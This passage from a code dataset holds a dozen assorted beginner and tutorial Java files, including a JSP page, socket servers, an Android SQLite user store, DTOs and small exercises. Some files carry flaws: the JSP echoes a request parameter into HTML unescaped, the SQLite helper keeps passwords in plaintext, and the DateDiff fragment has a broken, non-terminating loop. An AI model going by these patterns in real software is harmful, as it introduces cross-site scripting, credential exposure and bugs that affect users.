: \" + formatedDate); \r\n\t\t\t\r\n\t\t\t\t}\r\n\t\t\tint arr[] = {1, 2, 3, 4, 5};\r\n\t\t\tSystem.out.println(\"string[0]==\"+string[0]);\r\n\t\t\tArrayList list = new ArrayList<>();\r\n\t\t\tint i, j;\r\n\t\t\tSystem.out.println(\"string.length=\"+string.length);\r\n\t\t\tfor (i = 0; i < string.length; i++)\r\n\t\t\t{\r\n\t\t\t\tfor (j = i + 1; j < j+1; j++)\r\n\t\t\t\t{\r\n\t\t\t\t\t//if (arr[j] - arr[i] > list.size())\r\n\t\t\t\t\t\t//list.add( string[j] - string[i]);\r\n\t\t\t\t\tSystem.out.println(arr[j] - arr[i]+\"===\"+list.get(i));\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t}catch (ParseException e) {\r\n\t\t\t\t// TODO Auto-generated catch block\r\n\t\t\t\te.printStackTrace();\r\n\t\t\t}\r\n\t\t\t\r\n\t\t}\r\n\r\n\t\t/* Driver program to test above functions */\r\n\t\tpublic static void main(String[] args)\r\n\t\t{\r\n\t\t\tDateDiff maxdif = new DateDiff();\r\n\t\t\tmaxdif.maxDiff();\r\n\t\t\t\r\n\t\t\t\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t}\r\n\t\r\n\r\n\t// This code has been contributed by Mayank Jaiswal\r\n\r\n\r\n}\r\n",
    "package com.exlservice.cobol2java.dto;\n\npublic class PurchaseOrder {\n    private String poNumber;\n    private String buyerCode;\n    private int quantity;\n    private double unitPrice;\n    private int orderDate;\n    private int deliveryDate;\n\n\n    public PurchaseOrder(String dataLine, int i) {\n        if (i==1) {\n            this.poNumber = dataLine.substring(347, 353);\n            this.buyerCode = dataLine.substring(353, 356);\n            this.quantity = Integer.parseInt(dataLine.substring(356, 363));\n            this.unitPrice = Float.parseFloat(dataLine.substring(363, 371));\n            this.orderDate = Integer.parseInt(dataLine.substring(372, 380));\n            this.deliveryDate = Integer.parseInt(dataLine.substring(380, 388));\n        }\n\n        else if (i==2){\n            this.poNumber = dataLine.substring(388, 394);\n            this.buyerCode = dataLine.substring(394, 397);\n            this.quantity = Integer.parseInt(dataLine.substring(397, 404));\n            this.unitPrice = Float.parseFloat(dataLine.substring(404, 413));\n            this.orderDate = Integer.parseInt(dataLine.substring(413, 421));\n            this.deliveryDate = Integer.parseInt(dataLine.substring(421, 429));\n        }\n\n        else if (i==3){\n            this.poNumber = dataLine.substring(429, 435);\n            this.buyerCode = dataLine.substring(435, 438);\n            this.quantity = Integer.parseInt(dataLine.substring(438, 445));\n            this.unitPrice = Float.parseFloat(dataLine.substring(445, 454));\n            this.orderDate = Integer.parseInt(dataLine.substring(454, 462));\n            this.deliveryDate = Integer.parseInt(dataLine.substring(462, 470));\n        }\n\n    }\n\n    public String getPoNumber() {\n        return poNumber;\n    }\n\n    public void setPoNumber(String poNumber) {\n        this.poNumber = poNumber;\n    }\n\n    public String getBuyerCode() {\n        return buyerCode;\n    }\n\n    public void setBuyerCode(String buyerCode) {\n        this.buyerCode = buyerCode;\n    }\n\n    public int getQuantity() {\n        return quantity;\n    }\n\n    public void setQuantity(int quantity) {\n        this.quantity = quantity;\n    }\n\n    public double getUnitPrice() {\n        return unitPrice;\n    }\n\n    public void setUnitPrice(double unitPrice) {\n        this.unitPrice = unitPrice;\n    }\n\n    public int getOrderDate() {\n        return orderDate;\n    }\n\n    public void setOrderDate(int orderDate) {\n        this.orderDate = orderDate;\n    }\n\n    public int getDeliveryDate() {\n        return deliveryDate;\n    }\n\n    public void setDeliveryDate(int deliveryDate) {\n        this.deliveryDate = deliveryDate;\n    }\n}\n",
    "package com.vogella.unittest.email;\n\nimport java.util.regex.Pattern;\n\npublic class EmailValidator {\n\n    /**\n     * Email validation pattern.\n     */\n    public static final Pattern EMAIL_PATTERN = Pattern.compile(\n            \"[a-zA-Z0-9\\\\+\\\\.\\\\_\\\\%\\\\-\\\\+]{1,256}\" +\n                    \"\\\\@\" +\n                    \"[a-zA-Z0-9][a-zA-Z0-9\\\\-]{0,64}\" +\n                    \"(\" +\n                    \"\\\\.\" +\n                    \"[a-zA-Z0-9][a-zA-Z0-9\\\\-]{0,25}\" +\n                    \")+\"\n    );\n\n    private boolean mIsValid = false;\n\n    public boolean isValid() {\n        return mIsValid;\n    }\n\n    /**\n     * Validates if the given input is a valid email address.\n     *\n     * @param emailPattern The {@link Pattern} used to validate the given email.\n     * @param email        The email to validate.\n     * @return {@code true} if the input is a valid email. {@code false} otherwise.\n     */\n    public static boolean isValidEmail(CharSequence email) {\n        return email != null && EMAIL_PATTERN.matcher(email).matches();\n    }\n}",
    "package MatteoOrlando.U5D1;\nimport MatteoOrlando.U5D1.entites.Aggiunta;\nimport MatteoOrlando.U5D1.entites.Bevanda;\nimport MatteoOrlando.U5D1.entites.Pizza;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Arrays;\n\n@Configuration\npublic class ConfigBeans {\n\n    @Bean\n    public Pizza mergherita(){\n        Pizza pizza = new Pizza(\"Margherita\", 4.0);\n        pizza.setAggiunta(Arrays.asList(new Aggiunta(\"Prosciutto\", 1.0, \"Valore energetico - Calorie Prosciutto 138 kcal / 576 kj (100gr)\")));\n        return pizza;\n    }\n\n    @Bean\n    public Pizza hawaiian(){\n        Pizza pizza = new Pizza(\"La Immangiabile\", 22.0);\n        pizza.setAggiunta(Arrays.asList(new Aggiunta(\"Prosciutto\", 1.0, \"Valore energetico - Calorie Prosciutto 138 kcal / 576 kj (100gr)\"),\n                                        new Aggiunta(\"Ananas\", \"Valore energetico - Calorie Ananas fresco 40 kcal / 165 kj (100gr)\")));\n        return pizza;\n    }\n\n    @Bean\n    public Bevanda cola(){\n        return new Bevanda(\"Pepsi\", 1.5, \"Valore energetico - Calorie Bevanda tipo cola 39 kcal / 165 kj\");\n    }\n\n}\n",
    "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class MainServer {\n    public static void main(String[] args) {\n        System.out.println(\"Server started...\");\n        int port = 8087;\n        while (true) {\n            try (ServerSocket serverSocket = new ServerSocket(port);\n                 Socket clientSocket = serverSocket.accept();\n                 PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                 BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream())))\n            {\n                System.out.printf(\"New connection accepted Port: %d%n\", clientSocket.getPort());\n                final String name = in.readLine();\n                out.println(String.format(\"Hi %s, your port is %d\", name, clientSocket.getPort()));\n            }\n            catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n",
    "package org.apache.jsp;\n\nimport javax.servlet.*;\nimport javax.servlet.http.*;\nimport javax.servlet.jsp.*;\n\npublic final class new_jsp extends org.apache.jasper.runtime.HttpJspBase\n    implements org.apache.jasper.runtime.JspSourceDependent {\n\n  private static final JspFactory _jspxFactory = JspFactory.getDefaultFactory();\n\n  private static java.util.List<String> _jspx_dependants;\n\n  private org.glassfish.jsp.api.ResourceInjector _jspx_resourceInjector;\n\n  public java.util.List<String> getDependants() {\n    return _jspx_dependants;\n  }\n\n  public void _jspService(HttpServletRequest request, HttpServletResponse response)\n        throws java.io.IOException, ServletException {\n\n    PageContext pageContext = null;\n    HttpSession session = null;\n    ServletContext application = null;\n    ServletConfig config = null;\n    JspWriter out = null;\n    Object page = this;\n    JspWriter _jspx_out = null;\n    PageContext _jspx_page_context = null;\n\n    try {\n      response.setContentType(\"text/html;charset=UTF-8\");\n      pageContext = _jspxFactory.getPageContext(this, request, response,\n      \t\t\tnull, true, 8192, true);\n      _jspx_page_context = pageContext;\n      application = pageContext.getServletContext();\n      config = pageContext.getServletConfig();\n      session = pageContext.getSession();\n      out = pageContext.getOut();\n      _jspx_out = out;\n      _jspx_resourceInjector = (org.glassfish.jsp.api.ResourceInjector) application.getAttribute(\"com.sun.appserv.jsp.resource.injector\");\n\n      out.write(\"\\n\");\n      out.write(\"\\n\");\n      out.write(\"\\n\");\n      out.write(\"<!DOCTYPE html>\\n\");\n      out.write(\"<html>\\n\");\n      out.write(\"    <head>\\n\");\n      out.write(\"        <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=UTF-8\\\">\\n\");\n      out.write(\"        <title>JSP Page</title>\\n\");\n      out.write(\"    </head>\\n\");\n      out.write(\"    <body>\\n\");\n      out.write(\"        <h2>JSP Expressions</h2>\\n\");\n      out.write(\"<ul>\\n\");\n      out.write(\"  <li>Current time: \");\n      out.print( new java.util.Date() );\n      out.write(\"\\n\");\n      out.write(\"  <li>Your hostname: \");\n      out.print( request.getRemoteHost() );\n      out.write(\"\\n\");\n      out.write(\"  <li>Your session ID: \");\n      out.print( session.getId() );\n      out.write(\"\\n\");\n      out.write(\"  <li>The <CODE>testParam</CODE> form parameter:\\n\");\n      out.write(\"      \");\n      out.print( request.getParameter(\"testParam\") );\n      out.write(\"\\n\");\n      out.write(\"</ul>\\n\");\n      out.write(\"    </body>\\n\");\n      out.write(\"</html>\\n\");\n    } catch (Throwable t) {\n      if (!(t instanceof SkipPageException)){\n        out = _jspx_out;\n        if (out != null && out.getBufferSize() != 0)\n          out.clearBuffer();\n        if (_jspx_page_context != null) _jspx_page_context.handlePageException(t);\n        else throw new ServletException(t);\n      }\n    } finally {\n      _jspxFactory.releasePageContext(_jspx_page_context);\n    }\n  }\n}\n",
    "import java.io.*;\r\n\r\npublic class Main {\r\n public static void main(String[] args) throws Exception {\r\n        String filePath=\"C:\\\\Users\\\\28413\\\\Desktop\\\\PROG-2-2024\\\\fsfsds\\\\FileReader\\\\Groceries.txt\";\r\n        String fileToWriter=\"C:\\\\Users\\\\28413\\\\Desktop\\\\PROG-2-2024\\\\fsfsds\\\\FileReader\\\\GroceriesFormatted.txt\"; \r\n        String[] array=new String[4];\r\n        String id;\r\n        String itemName;\r\n        String quantity;\r\n        String separator=\",\";\r\n        double total=0;\r\n        double price;\r\n\r\n        FileReader fileReader=new FileReader(filePath);\r\n        FileWriter fileWriter=new FileWriter(fileToWriter);\r\n\r\n        BufferedReader reader=new BufferedReader(fileReader);\r\n        BufferedWriter writer=new BufferedWriter(fileWriter);\r\n\r\n        String heading;\r\n        heading=\"ID#\"+\"\\t\"+\"Item\"+\"\\t\\t\\t\"+\"Quantity\"+\"\\t\\t\"+\"Price(\u20ac)\"+\".\";\r\n        System.out.println(heading);\r\n\r\n        writer.write(\"*******************************************************\");\r\n        writer.newLine();\r\n        writer.write(heading);\r\n        writer.newLine();\r\n        String line;\r\n\r\n        while((line=reader.readLine())!=null){\r\n            array=line.split(separator);\r\n            id=array[0];\r\n            itemName=array[1];\r\n            quantity=array[2];\r\n            price=Double.parseDouble(array[3]);\r\n             total+=price;\r\n             if(itemName.length()<5&&quantity.length()<4){\r\n            line=id+\"\\t\"+itemName+\"\\t\\t\\t\"+quantity+\"\\t\\t\\t\"+price+\".\";\r\n            }else if(itemName.length()>=5&&quantity.length()<4){\r\n            line=id+\"\\t\"+itemName+\"\\t\\t\\t\"+quantity+\"\\t\\t\\t\"+price+\".\";\r\n            }else{\r\n             line=id+\"\\t\"+itemName+\"\\t\\t\\t\"+quantity+\"\\t\\t\\t\"+price+\".\";\r\n }\r\n         System.out.println(line);\r\n         writer.write(line);\r\n         writer.newLine();\r\n }         \r\n\r\n     System.out.println(\"\\n\"+\"Total price of groceries:\"+Math.round(total));\r\n        writer.write(\"*******************************************************\");\r\n        writer.write(\"\\n\"+\"The grocery shopping total is:\u20ac\"+Math.round(total));\r\n\r\n        reader.close();\r\n        writer.flush();\r\n        writer.close();\r\n\r\n    }\r\n}\r\n\r\n",
    "[2:37 PM, 4/2/2024] Ashu: public class HousingPriceAnalyzer {\r\n\r\n  public static Map<PriceRange, HousingStats> analyze(List<Double> prices, List<Double> squareFootages) {\r\n    if (prices.size() != squareFootages.size()) {\r\n      throw new IllegalArgumentException(\"Prices and square footages must have the same size\");\r\n    }\r\n    Map<PriceRange, HousingStats> results = new HashMap<>();\r\n    for (int i = 0; i < prices.size(); i++) {\r\n      double price = prices.get(i);\r\n      double sqFootage = squareFootages.get(i);\r\n      PriceRange range = getPriceRange(price);\r\n      HousingStats stats = results.get(range);\r\n      if (stats == null) {\r\n        stats = new HousingStats();\r\n        results.put(range, stats);\r\n      }\r\n      stats.count++;\r\n      stats.totalPrice += price;\r\n      stats.totalSqFootage += sqFootage;\r\n    }\r\n    return results;\r\n  }\r\n\r\n  private static PriceRange getPriceRange(double price) {\r\n    int rangeStart = (int) (price / 100000) * 100000;\r\n    return new PriceRange(rangeStart, rangeStart + 100000);\r\n  }\r\n\r\n  static class PriceRange {\r\n    final int startPrice;\r\n    final int endPrice;\r\n\r\n    public PriceRange(int startPrice, int endPrice) {\r\n      this.startPrice = startPrice;\r\n      this.endPrice = endPrice;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n      return \"$\" + startPrice + \" - $\" + endPrice;\r\n    }\r\n  }\r\n\r\n  static class HousingStats {\r\n    int count;\r\n    double totalPrice;\r\n    double totalSqFootage;\r\n\r\n    double getAveragePrice() {\r\n      return count > 0 ? totalPrice / count : 0.0;\r\n    }\r\n\r\n    double getAverageSqFootage() {\r\n      return count > 0 ? totalSqFootage / count : 0.0;\r\n    }\r\n  }\r\n}\r\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Main.java to edit this template\n */\npackage luassegitiga;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n/**\n *\n * @author USER\n */\npublic class Luassegitiga {\n\n    /**\n     * @param args the command line arguments\n     */\n    public static void main(String[] args) {\n          BufferedReader dtain = new BufferedReader (new InputStreamReader (System.in));\n          \n          String nama = \"I Kadek Hermawan\";\n          int nim = 22010186;\n          \n          System.out.println(\"Nama saya: \"+ nama);\n          System.out.println(\"NIM      : \"+ nim);\n        \n        Double luas;\n        int a = 0;\n        int t = 0;\n        String alas =\"\";\n        String tinggi=\"\";\n        \n        System.out.println(\"HITUNG LUAS SEGITIGA\");\n        \n        try{\n            System.out.print(\"Masukan Nilai Alas: \");\n            alas = dtain.readLine();\n            System.out.print(\"Masukan Nilai Tinggi: \");\n            tinggi = dtain.readLine();\n        }catch(IOException e) {\n            System.out.println(\"Kesalahan Dalam Input Data!\");\n        }\n        a = Integer.parseInt(alas);\n        t = Integer.parseInt(tinggi);\n        luas = 0.5 * a * t;\n        System.out.println(\"Hasil Luas Segitiga: \" + luas);\n         \n    }\n    \n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage com.mycompany.pertemuan1;\n\n/**\n *\n * @author user\n */\npublic class Loginform extends javax.swing.JFrame {\n\n    /**\n     * Creates new form Loginform\n     */\n    public Loginform() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jPanel2 = new javax.swing.JPanel();\n        jPanel4 = new javax.swing.JPanel();\n        jPanel5 = new javax.swing.JPanel();\n        jPanel6 = new javax.swing.JPanel();\n        jPanel3 = new javax.swing.JPanel();\n        jPanel7 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        jTextField1 = new javax.swing.JTextField();\n        jTextField2 = new javax.swing.JTextField();\n        jLabel3 = new javax.swing.JLabel();\n        jButton1 = new javax.swing.JButton();\n\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel2Layout.setVerticalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);\n        jPanel4.setLayout(jPanel4Layout);\n        jPanel4Layout.setHorizontalGroup(\n            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel4Layout.setVerticalGroup(\n            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);\n        jPanel5.setLayout(jPanel5Layout);\n        jPanel5Layout.setHorizontalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n        jPanel5Layout.setVerticalGroup(\n            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 100, Short.MAX_VALUE)\n        );\n\n        jPanel6.setBorder(javax.swing.BorderFactory.createEtchedBorder());\n\n        javax.swing.GroupLayout jPanel6Layout = new javax.swing.GroupLayout(jPanel6);\n        jPanel6.setLayout(jPanel6Layout);\n        jPanel6Layout.setHorizontalGroup(\n            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 260, Short.MAX_VALUE)\n        );\n        jPanel6Layout.setVerticalGroup(\n            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 175, Short.MAX_VALUE)\n        );\n\n        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);\n        jPanel3.setLayout(jPanel3Layout);\n        jPanel3Layout.setHorizontalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 286, Short.MAX_VALUE)\n        );\n        jPanel3Layout.setVerticalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 208, Short.MAX_VALUE)\n        );\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel7.setBorder(javax.swing.BorderFactory.createEtchedBorder());\n\n        jLabel1.setText(\"Nama\");\n\n        jLabel2.setText(\"Nim\");\n\n        jTextField1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField1ActionPerformed(evt);\n            }\n        });\n\n        jLabel3.setText(\"Form Login\");\n\n        jButton1.setText(\"LOGIN\");\n",
    "package com.example.kit_visiguard.sql;\n\nimport android.annotation.SuppressLint;\nimport android.content.ContentValues;\nimport android.content.Context;\nimport android.database.Cursor;\nimport android.database.sqlite.SQLiteDatabase;\nimport android.database.sqlite.SQLiteOpenHelper;\n\nimport com.example.kit_visiguard.User;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n *\n */\npublic class DatabaseHelper extends SQLiteOpenHelper {\n\n    // Database Version\n    private static final int DATABASE_VERSION = 1;\n\n    // Database Name\n    private static final String DATABASE_NAME = \"UserManager.db\";\n\n    // User table name\n    private static final String TABLE_USER = \"user\";\n\n    // User Table Columns names\n    private static final String COLUMN_USER_ID = \"user_id\";\n    private static final String COLUMN_USER_NAME = \"user_name\";\n    private static final String COLUMN_USER_EMAIL = \"user_email\";\n    private static final String COLUMN_USER_PASSWORD = \"user_password\";\n\n    // create table sql query\n    private String CREATE_USER_TABLE = \"CREATE TABLE \" + TABLE_USER + \"(\"\n            + COLUMN_USER_ID + \" INTEGER PRIMARY KEY AUTOINCREMENT,\" + COLUMN_USER_NAME + \" TEXT,\"\n            + COLUMN_USER_EMAIL + \" TEXT,\" + COLUMN_USER_PASSWORD + \" TEXT\" + \")\";\n\n    // drop table sql query\n    private String DROP_USER_TABLE = \"DROP TABLE IF EXISTS \" + TABLE_USER;\n\n    /**\n     * Constructor\n     *\n     *\n     */\n\n\n    public DatabaseHelper(Context context) {\n        super(context, DATABASE_NAME, null, DATABASE_VERSION);\n    }\n\n\n\n    @Override\n    public void onCreate(SQLiteDatabase db) {\n        db.execSQL(CREATE_USER_TABLE);\n    }\n\n\n\n\n    @Override\n    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {\n\n        //Drop User Table if exist\n        db.execSQL(DROP_USER_TABLE);\n\n        // Create tables again\n        onCreate(db);\n\n    }\n\n\n\n    /**\n     * This method is to create user record\n     *\n     *\n     */\n    public void addUser(User user) {\n        SQLiteDatabase db = this.getWritableDatabase();\n\n        ContentValues values = new ContentValues();\n        values.put(COLUMN_USER_NAME, user.getName());\n        values.put(COLUMN_USER_EMAIL, user.getEmail());\n        values.put(COLUMN_USER_PASSWORD, user.getPassword());\n\n        // Inserting Row\n        db.insert(TABLE_USER, null, values);\n        db.close();\n    }\n\n    /**\n     * This method is to fetch all user and return the list of user records\n     *\n     * @return list\n     */\n    @SuppressLint(\"Range\")\n    public List<User> getAllUser() {\n        // array of columns to fetch\n        String[] columns = {\n                COLUMN_USER_ID,\n                COLUMN_USER_EMAIL,\n                COLUMN_USER_NAME,\n                COLUMN_USER_PASSWORD\n        };\n        // sorting orders\n        String sortOrder =\n                COLUMN_USER_NAME + \" ASC\";\n        List<User> userList = new ArrayList<User>();\n\n        SQLiteDatabase db = this.getReadableDatabase();\n\n        // query the user table\n        /**\n         * Here query function is used to fetch records from user table this function works like we use sql query.\n         * SQL query equivalent to this query function is\n         * SELECT user_id,user_name,user_email,user_password FROM user ORDER BY user_name;\n         */\n        Cursor cursor = db.query(TABLE_USER, //Table to query\n                columns,    //columns to return\n                null,        //columns for the WHERE clause\n                null,        //The values for the WHERE clause\n                null,       //group the rows\n                null,       //filter by row groups\n                sortOrder); //The sort order\n\n\n        // Traversing through all rows and adding to list\n        if (cursor.moveToFirst()) {\n            do {\n                User user = new User();\n                user.setId(Integer.parseInt(cursor.getString(cursor.getColumnIndex(COLUMN_USER_ID))));\n                user.setName(cursor.getString(cursor.getColumnIndex(COLUMN_USER_NAME)));\n                user.setEmail(cursor.getString(cursor.getColumnIndex(COLUMN_USER_EMAIL)));\n                user.setPassword(cursor.getString(cursor.getColumnIndex(COLUMN_USER_PASSWORD)));\n                // Adding user record to list\n                userList.add(user);\n            } while (cursor.moveToNext());\n        }\n        cursor.close();\n        db.close();\n\n        // return user list\n        return userList;\n    }\n\n    /**\n     * This method to update user record\n     *\n     *\n     */\n    public void updateUser(User user) {\n        SQLiteDatabase db = this.getWritableDatabase();\n\n        ContentValues values = new ContentValues();\n        values.put(COLUMN_USER_NAME, user.getName());\n        values.put(COLUMN_USER_EMAIL, user.getEmail());\n        values.put(COLUMN_USER_PASSWORD, user.getPassword());\n\n        // updating row\n        db.update(TABLE_USER, values, COLUMN_USER_ID + \" = ?\",\n                new String[]{String.valueOf(user.getId())});\n        db.close();\n    }",
    "import java.util.*;\r\n\r\nclass Movie {\r\n    private String title;\r\n    private String rating;\r\n    private double ratingValue;\r\n\r\n    public Movie(String title, String rating, double ratingValue) {\r\n        this.title = title;\r\n        this.rating = rating;\r\n        this.ratingValue = ratingValue;\r\n    }\r\n\r\n    public String getTitle() {\r\n        return title;\r\n    }\r\n\r\n    public String getRating() {\r\n        return rating;\r\n    }\r\n\r\n    public double getRatingValue() {\r\n        return ratingValue;\r\n    }\r\n}\r\n\r\npublic class MovieRatingAnalyzer {\r\n    public static void main(String[] args) {\r\n        // Sample movie ratings\r\n        List<Movie> movies = new ArrayList<>();\r\n        movies.add(new Movie(\"Movie 1\", \"PG\", 4.5));\r\n        movies.add(new Movie(\"Movie 2\", \"PG-13\", 3.8));\r\n        movies.add(new Movie(\"Movie 3\", \"R\", 4.2));\r\n        movies.add(new Movie(\"Movie 4\", \"PG\", 3.9));\r\n        movies.add(new Movie(\"Movie 5\", \"PG-13\", 4.1));\r\n        movies.add(new Movie(\"Movie 6\", \"R\", 3.7));\r\n\r\n        // Calculate movie ratings statistics\r\n        Map<String, Integer> categoryCounts = new HashMap<>();\r\n        Map<String, Double> categoryTotalRatings = new HashMap<>();\r\n\r\n        for (Movie movie : movies) {\r\n            String ratingCategory = movie.getRating();\r\n            double ratingValue = movie.getRatingValue();\r\n\r\n            // Update category counts\r\n            categoryCounts.put(ratingCategory, categoryCounts.getOrDefault(ratingCategory, 0) + 1);\r\n\r\n            // Update category total ratings\r\n            categoryTotalRatings.put(ratingCategory, categoryTotalRatings.getOrDefault(ratingCategory, 0.0) + ratingValue);\r\n        }\r\n\r\n        // Calculate average rating for each category\r\n        Map<String, Double> categoryAverageRatings = new HashMap<>();\r\n        for (String category : categoryCounts.keySet()) {\r\n            int count = categoryCounts.get(category);\r\n            double totalRating = categoryTotalRatings.get(category);\r\n            double avgRating = totalRating / count;\r\n            categoryAverageRatings.put(category, avgRating);\r\n        }\r\n\r\n        // Print movie ratings statistics\r\n        System.out.println(\"Movie Ratings Statistics:\");\r\n        for (String category : categoryCounts.keySet()) {\r\n            int count = categoryCounts.get(category);\r\n            double avgRating = categoryAverageRatings.get(category);\r\n            System.out.println(\"Category: \" + category);\r\n            System.out.println(\"Number of Movies: \" + count);\r\n            System.out.println(\"Average Rating: \" + avgRating);\r\n            System.out.println();\r\n        }\r\n    }\r\n}",
    "package com.ahsen.shopmanagement.controllers;\n\nimport jakarta.persistence.Entity;\nimport jakarta.persistence.GeneratedValue;\nimport jakarta.persistence.GenerationType;\nimport jakarta.persistence.Id;\nimport jakarta.persistence.ManyToOne;\nimport jakarta.persistence.JoinColumn;\nimport java.time.LocalDateTime;\n\n@Entity\npublic class PricingHistory {\n    @Id\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\n    private Long id;\n\n    @ManyToOne\n    @JoinColumn(name = \"product_id\", nullable = false)\n    private Product product;\n\n    private double price;\n    private LocalDateTime dateChanged;\n\n    public PricingHistory() {\n    }\n\n    public PricingHistory(Product product, double price, LocalDateTime dateChanged) {\n        this.product = product;\n        this.price = price;\n        this.dateChanged = dateChanged;\n    }\n\n    // Getters and setters\n    public Long getId() {\n        return id;\n    }\n\n    public void setId(Long id) {\n        this.id = id;\n    }\n\n    public Product getProduct() {\n        return product;\n    }\n\n    public void setProduct(Product product) {\n        this.product = product;\n    }\n\n    public double getPrice() {\n        return price;\n    }\n\n    public void setPrice(double price) {\n        this.price = price;\n    }\n\n    public LocalDateTime getDateChanged() {\n        return dateChanged;\n    }\n\n    public void setDateChanged(LocalDateTime dateChanged) {\n        this.dateChanged = dateChanged;\n    }\n}\n",
    "package ServidorMultihilo;\n\nimport java.io.BufferedReader;\nimport java.io.File;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.nio.file.Paths;\n\npublic class HiloHandler implements Runnable{\n    private final Socket ch;\n    PrintWriter out;\n    BufferedReader in;\n    private int clientNumber;\n\n\n    public HiloHandler(Socket ch, int clientNumber) throws IOException{\n        this.ch = ch;\n        out = new PrintWriter(ch.getOutputStream(), true);\n        in = new BufferedReader(new InputStreamReader((ch.getInputStream())));\n        this.clientNumber = clientNumber;\n\n        System.out.println(\"Conexi\u00f3n \" + clientNumber + \" recibida del cliente: \" + ch.getInetAddress().getHostAddress());\n    }\n\n    @Override\n    public void run() {\n        try {\n            String pathArchivo = Paths.get(\"ServidorMultihilo//archivote.csv\").toAbsolutePath().toString();\n            File file_in = new File(pathArchivo);\n\n            FileReader fr;\n            fr = new FileReader(file_in);\n            BufferedReader br = new BufferedReader(fr);\n\n            String lineaLeida;\n\n            while((lineaLeida = br.readLine()) != null){\n                out.println(lineaLeida);\n            }\n\n            out.println(\"EOF\");\n            br.close();\n            fr.close();\n\n            System.out.println(\"Cliente: \" + clientNumber + \" \" + in.readLine());\n\n            out.close();\n            in.close();\n            ch.close();\n        \n\n        } catch (IOException exception) {\n            System.out.println(exception);\n        }\n    }\n    \n}\n",
